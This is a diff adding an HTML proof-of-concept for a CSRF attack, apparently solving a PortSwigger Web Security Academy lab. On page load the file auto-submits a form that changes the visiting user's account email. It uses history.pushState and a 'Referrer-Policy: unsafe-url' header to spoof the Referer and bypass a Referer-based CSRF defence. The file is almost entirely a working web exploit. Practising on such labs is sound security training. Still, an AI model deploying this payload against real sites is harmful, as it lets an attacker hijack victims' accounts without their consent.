@@ -1,0 +1,26 @@
+﻿<!-- Not work from the browser -->
+<!-- in portswigger exploit server's head add -->
+<!-- Referrer-Policy: unsafe-url -->
+<html>
+  <form
+    id="csrf-form"
+    enctype="application/x-www-form-urlencoded"
+    method="POST"
+    action="https://0a6a00bd032dcb78c0d63cda00e000d0.web-security-academy.net/my-account/change-email"
+  >
+    <table>
+      <tr>
+        <td>email</td>
+        <td><input type="text" value="test@test4.com" name="email" /></td>
+      </tr>
+    </table>
+    <input
+      type="submit"
+      value="https://0a6a00bd032dcb78c0d63cda00e000d0.web-security-academy.net/my-account/change-email"
+    />
+  </form>
+  <script>
+    history.pushState("","","/?0a6a00bd032dcb78c0d63cda00e000d0.web-security-academy.net");
+    document.getElementById("csrf-form").submit();
+  </script>
+</html>
